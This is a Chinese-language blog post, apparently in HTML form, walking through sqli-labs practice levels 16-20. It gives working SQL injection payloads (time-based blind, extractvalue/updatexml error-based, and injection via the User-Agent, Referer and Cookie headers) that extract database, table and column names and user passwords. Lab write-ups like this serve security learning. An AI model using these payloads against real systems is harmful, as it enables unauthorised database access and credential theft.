@@ -1,0 +1,161 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>SQL注入靶场（四） | Maxenton</title><meta name="author" content="Maxenton"><meta name="copyright" content="Maxenton"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SQL注入靶场。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入靶场（四）">
+<meta property="og:url" content="https://threeshui.github.io/2022/09/10/%E7%94%9F%E5%91%BD%E5%9C%A8%E4%BA%8E%E6%8A%98%E8%85%BE%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AE%9E%E6%93%8D%EF%BC%88%E5%9B%9B%EF%BC%89less16-20/index.html">
+<meta property="og:site_name" content="Maxenton">
+<meta property="og:description" content="SQL注入靶场。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://threeshui.github.io/img/sqlbachang.png">
+<meta property="article:published_time" content="2022-09-09T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-11-14T11:07:25.496Z">
+<meta property="article:author" content="Maxenton">
+<meta property="article:tag" content="信息安全">
+<meta property="article:tag" content="打靶记录">
+<meta property="article:tag" content="SQL注入靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://threeshui.github.io/img/sqlbachang.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://threeshui.github.io/2022/09/10/%E7%94%9F%E5%91%BD%E5%9C%A8%E4%BA%8E%E6%8A%98%E8%85%BE%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AE%9E%E6%93%8D%EF%BC%88%E5%9B%9B%EF%BC%89less16-20/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?2ec9fa90a95a4d6f2c1057f31b412d4a";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Maxenton","link":"链接: ","source":"来源: Maxenton","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SQL注入靶场（四）',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-11-14 19:07:25'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom/custom.css"><script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">75</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">38</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">38</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/sqlbachang.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Maxenton</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SQL注入靶场（四）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-09-09T16:00:00.000Z" title="发表于 2022-09-10 00:00:00">2022-09-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-11-14T11:07:25.496Z" title="更新于 2022-11-14 19:07:25">2022-11-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/">打靶记录</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/SQL%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/">SQL注入靶场</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">967</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>4分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SQL注入靶场（四）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="一、实操环境"><a href="#一、实操环境" class="headerlink" title="一、实操环境"></a>一、实操环境</h1><h2 id="1、操作系统"><a href="#1、操作系统" class="headerlink" title="1、操作系统"></a>1、操作系统</h2><ol>
+<li>VMware虚拟机创建的win10系统</li>
+<li>内存8GB</li>
+<li>硬盘255GB</li>
+<li>处理器AMD Ryzen 9 5900HX</li>
+</ol>
+<h2 id="2、操作项目"><a href="#2、操作项目" class="headerlink" title="2、操作项目"></a>2、操作项目</h2><p>&#x3D;&#x3D;sql-lib项目，本篇文章介绍关卡16-20。&#x3D;&#x3D;<br>##		3、工具版本<br> 5. phpstudy 8.1.1.3<br> 6. php版本 5.4.45nts<br> 7. Apache2.4.39<br> 8. MySQL5.7.26<br> 9. Chrome<br>##		4、SQL注入目的</p>
+<ol>
+<li>判断是否允许注入</li>
+<li>判断注入点类型</li>
+<li>判断回显点</li>
+<li>获取数据库信息</li>
+<li>获取表信息 </li>
+<li>获取字段信息</li>
+</ol>
+<h1 id="二、less16"><a href="#二、less16" class="headerlink" title="二、less16"></a>二、less16</h1><h2 id="1、判断注入"><a href="#1、判断注入" class="headerlink" title="1、判断注入"></a>1、判断注入</h2><p>输入了admin’、admin”以及加上各种括号都不显示，可能是延迟注入，和15关一样，不一样的是这里为双引号盲注。<br>##		2、获取数据库信息<br>输入admin’’ and if(substr((select database()),1,1)&#x3D;’s’,sleep(5),1)#&#x3D;&#x3D;也可以用ascii判断&#x3D;&#x3D;</p>
+<h2 id="3、获取表信息"><a href="#3、获取表信息" class="headerlink" title="3、获取表信息"></a>3、获取表信息</h2><p>输入admin’’ and if((select count(*)from information_schema.tables where table_schema&#x3D;database())&#x3D;4,sleep(5),1)#<br>#		三、less17<br>##		1、判断注入<br>这一关就得多试试了，毕竟之前都是在username输入的，但不要忘记password输入框，在尝试过程中，无论username输入什么，回显都不变，那可能是在password存在注入点，尝试在password输入之前的东西，发现报错了，基于报错信息，可以知道是单引号注入，而且是报错注入。<br>##	2、获取数据库信息<br>利用extractvalue（）报错注入，可以得到数据库名。<br>passwd&#x3D;1’ and extractvalue(1,concat(‘<del>‘,(select database()),’</del>‘))#<br><img src="https://img-blog.csdnimg.cn/d4dd09e894904ff3a4d8a40b981d2be5.png" alt="在这里插入图片描述"><br>##		3、获取表信息<br>在passwd中，换成1’ and extractvalue(1,concat(‘<del>‘,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),’</del>‘))#，就可以得到表名。<br><img src="https://img-blog.csdnimg.cn/11345570cf934c89a5a02b8359658674.png" alt="在这里插入图片描述"><br>##		4、获取列信息<br>1’  and extractvalue(1,concat(‘<del>‘,(select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’ limit 0,1),’</del>‘))#<br><img src="https://img-blog.csdnimg.cn/d74f153217c84ad3af96975a7c8ec621.png" alt="在这里插入图片描述"><br>##		5、获取用户名密码<br>passwd&#x3D;1’ and updatexml(1,concat(0x7e,(select password from (select password from security.users limit 0,1)users),0x7e),1)#&amp;submit&#x3D;Submit<br><img src="https://img-blog.csdnimg.cn/b4d179da2d0c4ecc83c38a4b90831d78.png" alt="在这里插入图片描述"><br>#		四、less18<br>##		1、判断注入<br>经过测试，登录成功后显示IP地址和浏览器版本信息，登录失败只显示ip地址，而在账户名和密码后加上’#，但都被转义了，所以不能使用sql注入，最后测试发现可以在http头部UA注入。<br>##		2、获取数据库信息<br>抓包发送到重发器，然后修改UA头。<br><img src="https://img-blog.csdnimg.cn/5fa313e1578e4e9d874fc76a58aeabfd.png" alt="在这里插入图片描述"></p>
+<p>可以看到库名<br><img src="https://img-blog.csdnimg.cn/9eb58b4fa21b4871900d146d39aceba1.png" alt="在这里插入图片描述"></p>
+<h2 id="3、获取表信息-1"><a href="#3、获取表信息-1" class="headerlink" title="3、获取表信息"></a>3、获取表信息</h2><p>‘or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;’security’  limit 3,1),0x7e),1) or ‘1’&#x3D;’1<br><img src="https://img-blog.csdnimg.cn/a819fa89d94041a3a5c792924b8a4f01.png" alt="在这里插入图片描述"><br>##		4、获取列信息<br>‘or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users’  limit 4,1),0x7e),1) or ‘1’&#x3D;’1<img src="https://img-blog.csdnimg.cn/6f75d021382d4669802c6fded84c770d.png" alt="在这里插入图片描述"><br>##		5、获取字段信息<br>‘or updatexml(1,concat(0x7e,(select password from security.users limit 0,1),0x7e),1) or ‘1’&#x3D;’1<br><img src="https://img-blog.csdnimg.cn/5404a1f884e04f06a34d08d4156bf0bd.png" alt="在这里插入图片描述"><br>#		五、less19<br>##		1、判断注入<br>这一关和上一关类似，只是登录成功返回信息不一样，而且这一关是referer注入。<br>##		2、获取数据库信息<br>抓包，发送给重发器。<br>将referer改为1’,extractvalue(1,concat(0x5e,database())))#，获取到数据库名。<br><img src="https://img-blog.csdnimg.cn/dc4d2294c4974dc5ad9a7d9784ca6bee.png" alt="在这里插入图片描述"><br>##		3、获取表信息<br>1’,extractvalue(1,concat(0x5e,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()))))#<br><img src="https://img-blog.csdnimg.cn/75370b89c89c4bf7b4d1e66e5fdd1538.png" alt="在这里插入图片描述"></p>
+<h2 id="4、获取字段信息"><a href="#4、获取字段信息" class="headerlink" title="4、获取字段信息"></a>4、获取字段信息</h2><p>1’,extractvalue(1,concat(0x5e,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; database() and table_name &#x3D; ‘users’))))#<br><img src="https://img-blog.csdnimg.cn/ad567a487c534336bf7679b3da3313b3.png" alt="在这里插入图片描述"><br>##		5、获取详细信息<br>1’,extractvalue(1,concat(0x5e,(select group_concat(password) from users))))#<br><img src="https://img-blog.csdnimg.cn/4f0dcca56a4d4abf968314b8b3a82658.png" alt="在这里插入图片描述"><br>#		六、less20<br>##		1、判断注入<br>这一关是cookie存在注入，同样适用bp抓包。<br>##		2、获取数据库信息<br>这里注意识别一下，我这边是第二个数据包。更改cookie为uname&#x3D;-admin’ union select 1,2,database()–+<img src="https://img-blog.csdnimg.cn/7dfbb15cc0fe43eea2bc5dabbbb197e0.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/fe821a0162c545708b3f73b6710c7724.png" alt="在这里插入图片描述"><br>##		3、获取表信息<br>更改uname&#x3D;Dumb’ and updatexml(1,concat(0x5e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),0x5e),1) #<br><img src="https://img-blog.csdnimg.cn/5d0ab2f878e444d2a7bfde8a12266d71.png" alt="在这里插入图片描述"><br>##		4、获取字段名<br>更改uname&#x3D;Dumb’ and updatexml(1,concat(0x5e,(select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’ limit 1,1),0x5e),1) #<br><img src="https://img-blog.csdnimg.cn/7a26d2deaab84d729b53bcf2f0f7a185.png" alt="在这里插入图片描述"><br>##		5、获取字段值<br>uname&#x3D;Dumb’ and updatexml(1,concat(0x5e,(select username from users limit 0,1),0x5e),1) #<br><img src="https://img-blog.csdnimg.cn/afa5ed919e7f48ae882a7e9b1b9bff2d.png" alt="在这里插入图片描述"><br>#		七、总结与小记<br>本篇文章是sql-lib的16关到20关，有什么问题请留言，万分感谢。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://threeshui.github.io">Maxenton</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://threeshui.github.io/2022/09/10/%E7%94%9F%E5%91%BD%E5%9C%A8%E4%BA%8E%E6%8A%98%E8%85%BE%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AE%9E%E6%93%8D%EF%BC%88%E5%9B%9B%EF%BC%89less16-20/">https://threeshui.github.io/2022/09/10/%E7%94%9F%E5%91%BD%E5%9C%A8%E4%BA%8E%E6%8A%98%E8%85%BE%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AE%9E%E6%93%8D%EF%BC%88%E5%9B%9B%EF%BC%89less16-20/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://threeshui.github.io" target="_blank">Maxenton</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a><a class="post-meta__tags" href="/tags/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/">打靶记录</a><a class="post-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/">SQL注入靶场</a></div><div class="post_share"><div class="social-share" data-image="/img/sqlbachang.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/09/13/Yunzai-Bot%E6%8F%92%E4%BB%B6%E4%B8%ADpip%E5%91%BD%E4%BB%A4%E5%AE%89%E8%A3%85%E6%89%80%E9%9C%80%E5%BA%93%E6%8A%A5%E9%94%99/"><img class="prev-cover" src="/img/yunzai_img.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Yunzai-Bot插件中pip命令安装报错</div></div></a></div><div class="next-post pull-right"><a href="/2022/09/04/%E9%92%93%E9%B1%BC%E8%BD%AF%E4%BB%B6%E7%9A%84%E7%BC%96%E5%86%99/"><img class="next-cover" src="/img/fishing.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">钓鱼软件的编写</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/06/27/%E7%94%9F%E5%91%BD%E5%9C%A8%E4%BA%8E%E6%8A%98%E8%85%BE%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AE%9E%E6%93%8D%EF%BC%88%E4%B8%80%EF%BC%89less1-5/" title="SQL注入靶场（一）"><img class="cover" src="/img/sqlbachang.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-27</div><div class="title">SQL注入靶场（一）</div></div></a></div><div><a href="/2022/07/07/%E7%94%9F%E5%91%BD%E5%9C%A8%E4%BA%8E%E6%8A%98%E8%85%BE%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AE%9E%E6%93%8D%EF%BC%88%E4%BA%8C%EF%BC%89less6-10/" title="SQL注入靶场（二）"><img class="cover" src="/img/sqlbachang.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-07</div><div class="title">SQL注入靶场（二）</div></div></a></div><div><a href="/2022/10/02/%E7%94%9F%E5%91%BD%E5%9C%A8%E4%BA%8E%E6%8A%98%E8%85%BE%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AE%9E%E6%93%8D%EF%BC%88%E4%BA%94%EF%BC%89less21-25/" title="SQL注入靶场（五）"><img class="cover" src="/img/sqlbachang.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-02</div><div class="title">SQL注入靶场（五）</div></div></a></div><div><a href="/2022/10/15/%E7%94%9F%E5%91%BD%E5%9C%A8%E4%BA%8E%E6%8A%98%E8%85%BE%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AE%9E%E6%93%8D%EF%BC%88%E5%85%AD%EF%BC%89less26-30/" title="SQL注入靶场（六）"><img class="cover" src="/img/sqlbachang.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-15</div><div class="title">SQL注入靶场（六）</div></div></a></div><div><a href="/2022/08/10/%E7%94%9F%E5%91%BD%E5%9C%A8%E4%BA%8E%E6%8A%98%E8%85%BE%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AE%9E%E6%93%8D%EF%BC%88%E4%B8%89%EF%BC%89less11-15/" title="SQL注入靶场（三）"><img class="cover" src="/img/sqlbachang.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-10</div><div class="title">SQL注入靶场（三）</div></div></a></div><div><a href="/2022/06/17/%E7%94%9F%E5%91%BD%E5%9C%A8%E4%BA%8E%E6%8A%98%E8%85%BE%E2%80%94%E2%80%94XXS-labs/" title="XSS-labs靶场"><img class="cover" src="/img/xssbachang.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-17</div><div class="title">XSS-labs靶场</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Maxenton</div><div class="author-info__description">一个啥都只会一点的白帽子</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">75</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">38</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">38</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_15131581?spm=1030.2200.3001.5343"><i class="fab fa-cuttlefish"></i><span>CSDN欢迎关注</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/threeshui" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:peiyimiao@foxmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://blog.csdn.net/qq_15131581?spm=1030.2200.3001.5343" target="_blank" title=""><i class="fab fa-cuttlefish"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到这里，愿君所遇即所爱！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%AE%9E%E6%93%8D%E7%8E%AF%E5%A2%83"><span class="toc-number">1.</span> <span class="toc-text">一、实操环境</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.1.</span> <span class="toc-text">1、操作系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E6%93%8D%E4%BD%9C%E9%A1%B9%E7%9B%AE"><span class="toc-number">1.2.</span> <span class="toc-text">2、操作项目</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81less16"><span class="toc-number">2.</span> <span class="toc-text">二、less16</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.</span> <span class="toc-text">1、判断注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E8%8E%B7%E5%8F%96%E8%A1%A8%E4%BF%A1%E6%81%AF"><span class="toc-number">2.2.</span> <span class="toc-text">3、获取表信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E8%8E%B7%E5%8F%96%E8%A1%A8%E4%BF%A1%E6%81%AF-1"><span class="toc-number">2.3.</span> <span class="toc-text">3、获取表信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E4%BF%A1%E6%81%AF"><span class="toc-number">2.4.</span> <span class="toc-text">4、获取字段信息</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/11/14/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" title="红日靶场1域控-打靶记录"><img src="/img/hongri.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场1域控-打靶记录"/></a><div class="content"><a class="title" href="/2022/11/14/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" title="红日靶场1域控-打靶记录">红日靶场1域控-打靶记录</a><time datetime="2022-11-13T16:00:00.000Z" title="发表于 2022-11-14 00:00:00">2022-11-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/01/%E7%94%9F%E5%91%BD%E5%9C%A8%E4%BA%8E%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="文件包含漏洞的学习"><img src="/img/baohan.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文件包含漏洞的学习"/></a><div class="content"><a class="title" href="/2022/11/01/%E7%94%9F%E5%91%BD%E5%9C%A8%E4%BA%8E%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="文件包含漏洞的学习">文件包含漏洞的学习</a><time datetime="2022-10-31T16:00:00.000Z" title="发表于 2022-11-01 00:00:00">2022-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/25/%E7%94%9F%E5%91%BD%E5%9C%A8%E4%BA%8E%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90/" title="文件解析漏洞的学习"><img src="/img/jiexi.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文件解析漏洞的学习"/></a><div class="content"><a class="title" href="/2022/10/25/%E7%94%9F%E5%91%BD%E5%9C%A8%E4%BA%8E%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90/" title="文件解析漏洞的学习">文件解析漏洞的学习</a><time datetime="2022-10-24T16:00:00.000Z" title="发表于 2022-10-25 00:00:00">2022-10-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/15/%E7%94%9F%E5%91%BD%E5%9C%A8%E4%BA%8E%E6%8A%98%E8%85%BE%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AE%9E%E6%93%8D%EF%BC%88%E5%85%AD%EF%BC%89less26-30/" title="SQL注入靶场（六）"><img src="/img/sqlbachang.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL注入靶场（六）"/></a><div 